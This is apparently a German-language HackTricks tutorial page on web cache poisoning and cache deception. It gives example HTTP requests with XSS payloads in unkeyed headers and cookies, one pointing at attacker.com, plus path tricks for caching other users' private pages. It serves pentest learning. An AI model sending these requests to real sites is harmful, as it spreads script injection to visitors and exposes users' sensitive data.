# Cache-Vergiftung und Cache-T√§uschung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos Workflows zu erstellen und zu **automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Der Unterschied

> **Was ist der Unterschied zwischen Web-Cache-Vergiftung und Web-Cache-T√§uschung?**
>
> * Bei der **Web-Cache-Vergiftung** veranlasst der Angreifer die Anwendung, einige b√∂sartige Inhalte im Cache zu speichern, die dann anderen Anwendern aus dem Cache bereitgestellt werden.
> * Bei der **Web-Cache-T√§uschung** veranlasst der Angreifer die Anwendung, einige sensible Inhalte eines anderen Benutzers im Cache zu speichern, und der Angreifer ruft dann diese Inhalte aus dem Cache ab.

## Cache-Vergiftung

Die Cache-Vergiftung zielt darauf ab, den Client-seitigen Cache zu manipulieren, um Clients dazu zu zwingen, Ressourcen zu laden, die unerwartet, teilweise oder unter der Kontrolle eines Angreifers stehen. Das Ausma√ü der Auswirkungen h√§ngt von der Beliebtheit der betroffenen Seite ab, da die verunreinigte Antwort ausschlie√ülich an Benutzer serviert wird, die die Seite w√§hrend der Zeit der Cache-Kontamination besuchen.

Die Durchf√ºhrung eines Cache-Vergiftungsangriffs umfasst mehrere Schritte:

1. **Identifizierung von nicht gekeyten Eingaben**: Dies sind Parameter, die zwar nicht f√ºr eine zwischengespeicherte Anfrage erforderlich sind, aber die Antwort beeinflussen k√∂nnen, die vom Server zur√ºckgegeben wird. Die Identifizierung dieser Eingaben ist entscheidend, da sie ausgenutzt werden k√∂nnen, um den Cache zu manipulieren.
2. **Ausnutzung der nicht gekeyten Eingaben**: Nach der Identifizierung der nicht gekeyten Eingaben besteht der n√§chste Schritt darin, herauszufinden, wie diese Parameter missbraucht werden k√∂nnen, um die Antwort des Servers auf eine Weise zu modifizieren, die dem Angreifer zugutekommt.
3. **Sicherstellen, dass die vergiftete Antwort zwischengespeichert wird**: Der letzte Schritt besteht darin, sicherzustellen, dass die manipulierte Antwort im Cache gespeichert wird. Auf diese Weise erh√§lt jeder Benutzer, der w√§hrend der Cache-Vergiftung auf die betroffene Seite zugreift, die verunreinigte Antwort.

### Entdeckung: √úberpr√ºfen von HTTP-Headern

Normalerweise gibt es einen **Header, der anzeigt**, dass eine Antwort im Cache **gespeichert wurde**, Sie k√∂nnen √ºberpr√ºfen, auf welche Header Sie in diesem Beitrag achten sollten: [**HTTP-Cache-Header**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Entdeckung: Caching-Fehlercodes

Wenn Sie vermuten, dass die Antwort im Cache gespeichert wird, k√∂nnten Sie versuchen, **Anfragen mit einem fehlerhaften Header zu senden**, auf die mit einem **Statuscode 400** geantwortet werden sollte. Versuchen Sie dann, auf die Anfrage normal zuzugreifen, und wenn die **Antwort ein Statuscode 400 ist**, wissen Sie, dass sie verwundbar ist (und Sie k√∂nnten sogar einen DoS durchf√ºhren).

Weitere Optionen finden Sie unter:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Beachten Sie jedoch, dass **manchmal diese Arten von Statuscodes nicht zwischengespeichert werden**, sodass dieser Test m√∂glicherweise nicht zuverl√§ssig ist.

### Entdeckung: Identifizieren und Auswerten von nicht gekeyten Eingaben

Sie k√∂nnten [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) verwenden, um Parameter und Header zu **brute-forcen**, die die **Antwort der Seite √§ndern** k√∂nnten. Eine Seite k√∂nnte beispielsweise den Header `X-Forwarded-For` verwenden, um dem Client anzuzeigen, dass das Skript von dort geladen werden soll:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicit a harmful response from the back-end server

Mit dem identifizierten Parameter/ Header √ºberpr√ºfen, wie er **ges√§ubert** wird und **wo** er **reflektiert** wird oder die Antwort vom Header beeinflusst. K√∂nnen Sie ihn trotzdem missbrauchen (XSS durchf√ºhren oder einen von Ihnen kontrollierten JS-Code laden? DoS durchf√ºhren?...)

### Get the response cached

Sobald Sie die **Seite** identifiziert haben, die missbraucht werden kann, welchen **Parameter**/**Header** Sie verwenden und **wie** Sie ihn **missbrauchen** k√∂nnen, m√ºssen Sie die Seite zwischenspeichern. Je nach Ressource, die Sie im Cache abrufen m√∂chten, kann dies einige Zeit in Anspruch nehmen. Es k√∂nnte sein, dass Sie es mehrere Sekunden lang versuchen m√ºssen.\
Der Header **`X-Cache`** in der Antwort k√∂nnte sehr n√ºtzlich sein, da er den Wert **`miss`** haben kann, wenn die Anfrage nicht zwischengespeichert wurde, und den Wert **`hit`**, wenn sie zwischengespeichert ist.\
Der Header **`Cache-Control`** ist auch interessant, um zu wissen, ob eine Ressource zwischengespeichert wird und wann die Ressource das n√§chste Mal wieder zwischengespeichert wird: `Cache-Control: public, max-age=1800`\
Ein weiterer interessanter Header ist **`Vary`**. Dieser Header wird oft verwendet, um **zus√§tzliche Header** anzugeben, die als **Teil des Cache-Schl√ºssels** behandelt werden, auch wenn sie normalerweise nicht als Schl√ºssel verwendet werden. Daher kann der Benutzer, wenn er den `User-Agent` des Opfers kennt, den Cache f√ºr die Benutzer mit diesem spezifischen `User-Agent` vergiften.\
Ein weiterer Header, der mit dem Cache zusammenh√§ngt, ist **`Age`**. Er definiert die Zeit in Sekunden, die das Objekt im Proxy-Cache war.

Beim Zwischenspeichern einer Anfrage sollten Sie **vorsichtig mit den Headern sein**, die Sie verwenden, da einige von ihnen **unerwartet als Schl√ºssel verwendet** werden k√∂nnten und das Opfer denselben Header verwenden muss. Testen Sie immer eine Cache-Vergiftung mit **verschiedenen Browsern**, um zu √ºberpr√ºfen, ob sie funktioniert.

## Exploiting Examples

### Einfachstes Beispiel

Ein Header wie `X-Forwarded-For` wird unsauber in der Antwort reflektiert.\
Sie k√∂nnen ein einfaches XSS-Payload senden und den Cache vergiften, sodass jeder, der auf die Seite zugreift, XSS erh√§lt:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache-Poisoning zum DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Verwendung von Web-Cache-Poisoning zur Ausnutzung von Cookie-Handling-Schwachstellen

Cookies k√∂nnten auch in der Antwort einer Seite reflektiert werden. Wenn Sie es missbrauchen k√∂nnen, um beispielsweise ein XSS zu verursachen, k√∂nnten Sie in der Lage sein, XSS in mehreren Clients auszunutzen, die die b√∂sartige Cache-Antwort laden.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Hinweis: Wenn das anf√§llige Cookie sehr h√§ufig von den Benutzern verwendet wird, werden regelm√§√üige Anfragen den Cache leeren.

### Cache-Vergiftung mit Pfadtraversierung zum Diebstahl des API-Schl√ºssels <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Dieser Bericht erkl√§rt**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), wie es m√∂glich war, einen OpenAI-API-Schl√ºssel mit einer URL wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` zu stehlen, weil alles, was zu `/share/*` passt, ohne Normalisierung der URL durch Cloudflare zwischengespeichert wird, was beim Erreichen des Webservers erfolgte.

### Verwendung mehrerer Header, um Schwachstellen bei der Web-Cache-Vergiftung auszunutzen <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Manchmal m√ºssen Sie **mehrere nicht gepr√ºfte Eingaben** ausnutzen, um einen Cache missbrauchen zu k√∂nnen. Wenn Sie beispielsweise einen **Offenen Weiterleitungsfehler** finden, wenn Sie `X-Forwarded-Host` auf eine von Ihnen kontrollierte Domain und `X-Forwarded-Scheme` auf `http` setzen. **Wenn** der **Server** alle **HTTP**-Anfragen **an HTTPS weiterleitet** und den Header `X-Forwarded-Scheme` als Domainnamen f√ºr die Weiterleitung verwendet. Sie k√∂nnen steuern, wohin die Seite durch die Weiterleitung zeigt.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Ausnutzung mit begrenztem `Vary`-Header

Wenn Sie feststellen, dass der **`X-Host`**-Header als **Domainname zum Laden einer JS-Ressource** verwendet wird, der **`Vary`**-Header in der Antwort jedoch auf **`User-Agent`** hinweist. Dann m√ºssen Sie einen Weg finden, um den User-Agent des Opfers zu exfiltrieren und den Cache mit diesem User-Agent zu manipulieren:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Senden Sie eine GET-Anfrage mit dem Request in der URL und im Body. Wenn der Webserver den aus dem Body verwendet, der Cache-Server jedoch den aus der URL zwischenspeichert, wird jeder, der auf diese URL zugreift, tats√§chlich den Parameter aus dem Body verwenden. √Ñhnlich der Schwachstelle, die James Kettle auf der Github-Website gefunden hat:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Parameter Cloaking

Zum Beispiel ist es m√∂glich, **Parameter** in Ruby-Servern mit dem Zeichen **`;`** anstelle von **`&`** zu trennen. Dies k√∂nnte verwendet werden, um nicht gekeyte Parameterwerte innerhalb gekeyter Parameter zu platzieren und sie zu missbrauchen.

Portswigger-Labor: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Ausnutzen der HTTP-Cache-Vergiftung durch Missbrauch des HTTP-Request-Smuggling

Erfahren Sie hier, wie Sie [Cache-Vergiftungsangriffe durch Missbrauch des HTTP-Request-Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) durchf√ºhren k√∂nnen.

### Automatisiertes Testen auf Web-Cache-Vergiftung

Der [Web-Cache-Vulnerability-Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) kann verwendet werden, um automatisch auf Web-Cache-Vergiftung zu testen. Er unterst√ºtzt viele verschiedene Techniken und ist hochgradig anpassbar.

Beispielverwendung: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos Workflows zu erstellen und zu **automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterst√ºtzt werden.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Anf√§llige Beispiele

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS leitete das Fragment innerhalb der URL weiter, ohne es zu entfernen, und generierte den Cache-Schl√ºssel nur unter Verwendung des Hosts, des Pfads und der Abfrage (wobei das Fragment ignoriert wurde). So wurde die Anfrage `/#/../?r=javascript:alert(1)` an das Backend als `/#/../?r=javascript:alert(1)` gesendet und der Cache-Schl√ºssel enthielt das Payload nicht, nur Host, Pfad und Abfrage.

### GitHub CP-DoS

Das Senden eines falschen Werts im Inhaltstyp-Header l√∂ste eine 405-Cacheantwort aus. Der Cache-Schl√ºssel enthielt das Cookie, sodass nur nicht authentifizierte Benutzer angegriffen werden konnten.

### GitLab + GCP CP-DoS

GitLab verwendet GCP-Buckets zur Speicherung statischer Inhalte. **GCP Buckets** unterst√ºtzen den Header `x-http-method-override`. Es war also m√∂glich, den Header `x-http-method-override: HEAD` zu senden und den Cache dazu zu bringen, eine leere Antwort zur√ºckzugeben. Es k√∂nnte auch die Methode `PURGE` unterst√ºtzen.

### Rack Middleware (Ruby on Rails)

In Ruby on Rails-Anwendungen wird h√§ufig Rack-Middleware verwendet. Der Zweck des Rack-Codes besteht darin, den Wert des Headers **`x-forwarded-scheme`** zu √ºbernehmen und ihn als Schemas der Anfrage festzulegen. Wenn der Header `x-forwarded-scheme: http` gesendet wird, erfolgt eine 301-Weiterleitung zum selben Ort, was potenziell zu einem Denial-of-Service (DoS) f√ºr diese Ressource f√ºhren kann. Dar√ºber hinaus k√∂nnte die Anwendung den `X-forwarded-host`-Header erkennen und Benutzer zur angegebenen Host-Adresse umleiten. Dieses Verhalten kann dazu f√ºhren, dass JavaScript-Dateien vom Server eines Angreifers geladen werden, was ein Sicherheitsrisiko darstellt.

### 403 und Speicher-Buckets

Cloudflare hat zuvor 403-Antworten zwischengespeichert. Der Versuch, auf S3- oder Azure-Speicherblobs mit falschen Autorisierungsheadern zuzugreifen, f√ºhrte zu einer 403-Antwort, die zwischengespeichert wurde. Obwohl Cloudflare aufgeh√∂rt hat, 403-Antworten zu zwischenspeichern, k√∂nnte dieses Verhalten noch bei anderen Proxy-Diensten vorhanden sein.

### Einf√ºgen von gekeyten Parametern

Caches enthalten oft spezifische GET-Parameter im Cache-Schl√ºssel. Zum Beispiel hat Fastlys Varnish den `size`-Parameter in Anfragen zwischengespeichert. Wenn jedoch eine URL-codierte Version des Parameters (z. B. `siz%65`) mit einem fehlerhaften Wert gesendet wurde, w√ºrde der Cache-Schl√ºssel unter Verwendung des korrekten `size`-Parameters konstruiert. Dennoch w√ºrde der Backend den Wert im URL-codierten Parameter verarbeiten. Das URL-Codieren des zweiten `size`-Parameters f√ºhrte dazu, dass er vom Cache ausgelassen, aber vom Backend genutzt wurde. Das Zuweisen eines Werts von 0 zu diesem Parameter f√ºhrte zu einem zwischenspeicherbaren 400 Bad Request-Fehler.

### Benutzer-Agent-Regeln

Einige Entwickler blockieren Anfragen mit Benutzer-Agenten, die denen von Hochverkehrs-Tools wie FFUF oder Nuclei entsprechen, um die Serverlast zu verwalten. Ironischerweise kann dieser Ansatz Sicherheitsl√ºcken wie Cache-Vergiftung und DoS einf√ºhren.

### Illegale Header-Felder

Die [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) spezifiziert die akzeptablen Zeichen in Header-Namen. Header, die Zeichen au√üerhalb des spezifizierten **tchar**-Bereichs enthalten, sollten idealerweise eine 400 Bad Request-Antwort ausl√∂sen. In der Praxis halten sich Server nicht immer an diesen Standard. Ein bemerkenswertes Beispiel ist Akamai, das Header mit ung√ºltigen Zeichen weiterleitet und jeden 400-Fehler zwischenspeichert, solange der `cache-control`-Header nicht vorhanden ist. Es wurde ein ausnutzbares Muster identifiziert, bei dem das Senden eines Headers mit einem ung√ºltigen Zeichen, wie `\`, zu einem zwischenspeicherbaren 400 Bad Request-Fehler f√ºhrte.

### Neue Header finden

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache-T√§uschung

Das Ziel der Cache-T√§uschung besteht darin, dass Clients **Ressourcen laden, die mit ihren sensiblen Informationen im Cache gespeichert werden**.

Zun√§chst ist zu beachten, dass **Erweiterungen** wie `.css`, `.js`, `.png` usw. normalerweise so **konfiguriert** sind, dass sie im **Cache gespeichert** werden. Wenn Sie also auf `www.example.com/profile.php/nonexistent.js` zugreifen, wird die Antwort wahrscheinlich im Cache gespeichert, da die Erweiterung `.js` erkannt wird. Wenn die **Anwendung** jedoch mit den **sensiblen** Benutzerinhalten, die in _www.example.com/profile.php_ gespeichert sind, **wiedergegeben** wird, k√∂nnen Sie diese Inhalte von anderen Benutzern **stehlen**.

Andere Dinge, die getestet werden sollten:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Verwenden Sie weniger bekannte Erweiterungen wie_ `.avif`

Ein weiteres sehr klares Beispiel finden Sie in diesem Bericht: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Im Beispiel wird erkl√§rt, dass wenn Sie eine nicht existierende Seite wie _http://www.example.com/home.php/non-existent.css_ laden, der Inhalt von _http://www.example.com/home.php_ (**mit den sensiblen Informationen des Benutzers**) zur√ºckgegeben wird und der Cache-Server das Ergebnis speichert.\
Dann kann der **Angreifer** auf _http://www.example.com/home.php/non-existent.css_ in seinem eigenen Browser zugreifen und die **vertraulichen Informationen** der Benutzer einsehen, die zuvor darauf zugegriffen haben.

Es ist zu beachten, dass der **Cache-Proxy** so konfiguriert sein sollte, dass Dateien **basierend** auf der **Erweiterung** der Datei (_.css_) und nicht basierend auf dem Inhaltstyp zwischengespeichert werden. Im Beispiel wird _http://www.example.com/home.php/non-existent.css_ einen `text/html`-Inhaltstyp anstelle eines `text/css`-MIME-Typs haben (was f√ºr eine _.css_-Datei erwartet wird).

Erfahren Sie hier, wie Sie [Cache-T√§uschungsangriffe durch Missbrauch des HTTP-Request-Smuggling](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) durchf√ºhren k√∂nnen.
## Automatische Tools

* [**toxicache**](https://github.com/xhzeem/toxicache): Golang-Scanner zum Auffinden von Web-Cache-Vergiftbarkeitsl√ºcken in einer Liste von URLs und zum Testen mehrerer Injektionstechniken.

## Referenzen

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um m√ºhelos **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
